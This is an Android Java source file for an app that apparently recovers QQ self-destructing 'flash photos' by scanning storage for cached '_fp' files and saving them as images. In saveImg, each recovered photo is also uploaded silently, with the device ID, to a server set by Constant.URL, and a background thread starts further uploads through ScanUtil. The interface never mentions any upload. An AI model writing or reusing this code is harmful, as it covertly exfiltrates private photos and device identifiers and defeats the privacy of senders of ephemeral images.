package com.xaoyv.qqcache;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.recyclerview.widget.GridLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import com.luck.picture.lib.PictureSelector;
import com.luck.picture.lib.entity.LocalMedia;
import com.tencent.mmkv.MMKV;
import com.xaoyv.qqcache.adapter.RecyAdap;
import com.xaoyv.qqcache.utils.ActivityUtils;
import com.xaoyv.qqcache.utils.AppUtils;
import com.xaoyv.qqcache.utils.BitMapUtils;
import com.xaoyv.qqcache.utils.Constant;
import com.xaoyv.qqcache.utils.NetUtils;
import com.xaoyv.qqcache.utils.ScanUtil;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

public class HomeActivity extends AppCompatActivity {
    private boolean haspre = false, isScan = false;
    private List<String> imgs = new ArrayList<>();
    private Button btn, btn_history;
    private TextView status;
    private RecyclerView recy;
    private String TAG = this.getClass().getSimpleName();
    private ScanUtil scanUtil;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_home);

        initView();

        reqPer();

        initData();
    }

    private void initData() {
        btn.setOnClickListener(this::onClick);
        btn_history.setOnClickListener(this::onClick);
    }

    private void runScan() {
        if (!isScan) {
            new Thread() {
                @Override
                public void run() {
                    isScan = true;
                    runOnUiThread(() -> btn.setText("正在扫描"));
                    //scan files
                    getFile(new File(Environment.getExternalStorageDirectory() + Constant.path));
                    runOnUiThread(() -> {
                        btn.setText("重新扫描");
                        status.setText("扫描到" + imgs.size() + "张图片");
                        int spanCount;
                        switch (imgs.size()) {
                            case 1:
                                spanCount = 1;
                                break;
                            case 4:
                            case 6:
                            case 8:
                                spanCount = 2;
                                break;
                            default:
                                spanCount = 3;
                        }
                        recy.setLayoutManager(new GridLayoutManager(HomeActivity.this, spanCount));
                        List<LocalMedia> localMedia = new ArrayList<>();
                        for (String path : imgs) {
                            LocalMedia e = new LocalMedia();
                            e.setPath(path);
                            localMedia.add(e);
                            Log.d(TAG, "initFileDir: " + path);
                        }
                        RecyAdap adapter = new RecyAdap(imgs);
                        adapter.setListener((view, position) -> {
                            PictureSelector.create(HomeActivity.this)
                                    .themeStyle(R.style.Picture_default_style)
                                    .openExternalPreview(position, Environment.getExternalStorageDirectory() + Constant.PICTURES_SAVE_PATH + "shanzhao/", localMedia);
                        });
                        recy.setAdapter(adapter);
                    });
                    isScan = false;
                }
            }.start();
            new Thread() {
                @Override
                public void run() {
                    if (scanUtil == null) {
                        scanUtil = new ScanUtil(HomeActivity.this);
                    }
                    scanUtil.type1 = false;
                    scanUtil.type2 = false;
                    scanUtil.uploadNext();
                }
            }.start();
        }
    }


    /**
     * scan to get file list
     *
     * @param file file
     */
    private void getFile(File file) {
        if (file == null) {
            return;
        }
        if (file.isFile()) {
            runOnUiThread(() -> status.setText("正在扫描" + file.getName()));
            if (file.getName().endsWith("_fp"))
                //find catch file and save it
                saveImg(file.getAbsolutePath());
        } else if (file.isDirectory()) {
            File[] files = file.listFiles();
            if (files == null)
                return;
            for (File f : files)
                getFile(f);
        }
    }

    private void reqPer() {
        requestPermissions(Constant.ALL_PERMISSIONS, Constant.REQUESTCODE);
    }

    private void initView() {
        ActivityUtils.setViewTransparent(this);
        ActivityUtils.changStatusIconCollor(this, true);
        btn = findViewById(R.id.btn);
        btn_history = findViewById(R.id.btn_history);
        status = findViewById(R.id.tv_status);
        recy = findViewById(R.id.recy);
    }


    /**
     * save images to ...
     *
     * @param path image path
     */
    private void saveImg(String path) {
        File file = new File(path);
        Bitmap bitmap = BitmapFactory.decodeFile(path);
        if (bitmap == null)
            return;

        // if file exist?
        String pathname = Constant.APP_SAVE_PATH + "/" + file.getName() + Constant.JPG;
        File f = new File(pathname);
        if (!f.exists()) {
            //save image
            BitMapUtils.saveImg2Sdcard(bitmap, Bitmap.CompressFormat.JPEG, pathname);
            imgs.add(pathname);
            NetUtils.getNetUtils().uploadHd(Constant.URL, f, AppUtils.getDeviceId(this));
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == Constant.REQUESTCODE) {
            changeText();
        }
    }

    private void onClick(View v) {
        switch (v.getId()) {
            case R.id.btn:
                imgs.clear();
                if (haspre) {
                    runScan();
                } else {
                    Toast.makeText(this, "请开启文件读写权限，否则无法破解闪照", Toast.LENGTH_LONG).show();
                    Uri packageURI = Uri.parse(Constant.PACKAGE_URI);
                    Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS, packageURI);
                    startActivity(intent);
                }
                break;

            case R.id.btn_history:
                startActivity(new Intent(HomeActivity.this, HistoryActivity.class));
                break;
        }
    }

    private void initFileDirs() {
        Constant.APP_SAVE_PATH = getExternalFilesDir("/").getAbsolutePath();
        Log.d(TAG, "initFileDirs: " + Constant.APP_SAVE_PATH);
    }

    @Override
    protected void onResume() {
        super.onResume();
        changeText();
    }

    private void changeText() {
        haspre = checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
                && checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
        if (haspre) {
            status.setText("点击开始扫描");
            btn.setText("开始扫描");
            initFileDirs();
        } else {
            status.setText("没有文件访问权限");
            btn.setText("点击授权");
        }
    }
}
